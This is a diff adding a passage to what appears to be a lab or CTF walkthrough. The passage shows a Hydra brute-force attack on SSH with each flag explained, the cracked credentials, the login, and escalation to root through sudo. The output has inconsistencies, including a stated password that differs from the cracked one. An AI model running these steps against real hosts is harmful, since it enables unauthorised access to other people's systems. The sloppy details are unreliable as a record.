@@ -135,6 +135,91 @@ As the username is identified from the earlier command and the wordlist has crea
 
 the command used is HYDRA which will initiate scanning by trying different combination of password wordlist with the specified wordlist.
 
+***hydra -l <username> -P /root/wordlist.txt -s 22 ssh -V -t 16
+
+-l flag is used specifically when the username is known or L should be used if the username should be brute forced using the wordlist created from the any source available
+
+-P flag is used to mention the path of the file whre the wordlist is saved or -p can be used if the password was available by any other method or from any other source
+
+-s flag is to specify the port number and port name for which the password is required here in the given scnario password is required for port 22 SSH
+
+-V verbose means print the result at the end where the combination of the username password is available
+
+-t task to be completed at a time i.e how may username and password cominations must be scanned at once<br>The maximum number of task that can be performed is 32 at once which eventually will save time for the attacker
+
+
+!!OUTPUT 
+
+[STATUS] attack started for 192.168.1.50 (on port 22/tcp)
+[22][ssh] host: 192.168.1.50   login: jack   password: password
+[22][ssh] host: 192.168.1.50   login: jack   password: admin
+[22][ssh] host: 192.168.1.50   login: jack   password: qwerty
+[22][ssh] host: 192.168.1.50   login: jack   password: 123456
+[22][ssh] host: 192.168.1.50   login: jack   password: secret123
+[1] [ssh] host: 192.168.1.50   login: jack   password: secret123
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished.
+
+
+***ssh jack@<target ip> -p 22
+
+-p Flag used to mention port number when the ssh is running on different port number rather than the default port number i.e 22
+
+Once its connected to the ssh successfully it wshould be authenticated with the password i.e cybersecurity in the current scenario
+
+!!OUTPUT
+
+jack@192.168.1.50's password: 
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+System information as of Fri May 29 17:10:15 UTC 2026
+
+  System load:  0.05               Processes:             102
+  Usage of /:   12.4% of 19.56GB   Users logged in:       1
+  Memory usage: 18%                IPv4 address for eth0: 192.168.1.50
+  Swap usage:   0%
+
+Expanded Security Maintenance for Applications is not enabled.
+
+Last login: Thu May 28 10:14:22 2026 from 192.168.1.100
+jack@remote-server:~$
+
+Note: here the ip address used is just to show the output
+
+After the authentication to the ssh port is successful we get the access to the target's terminal with standard user <br>Next to get the root access which is the hihest priviledge in Linux we should perform the previledge escalation
+
+jack@remote-server:~$ sudo -l<br> which asks for the sudo password for the jack user
+
+
+To check the priviledge of the cuurent user that is jack
+
+!!OUTPUT
+
+[sudo] password for jack: 
+Matching Defaults entries for jack on remote-server:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jack may run the following commands on remote-server:
+    (ALL : ALL) ALL
+
+ ***jack@remote-server:~$ sudo -i<br>  The command sudo -i (often called "interactive login") is used to switch from your current user account completely into the root (administrator) user environment. Instead of typing sudo before every single command you want to run, sudo -i gives you a permanent administrative session until you type exit.
+
+ !!OUTPUT
+
+ jack@remote-server:~$ sudo -i
+[sudo] password for jack: 
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-generic x86_64)
+
+root@remote-server:~#
+
+    
+
+
+
 
 
   
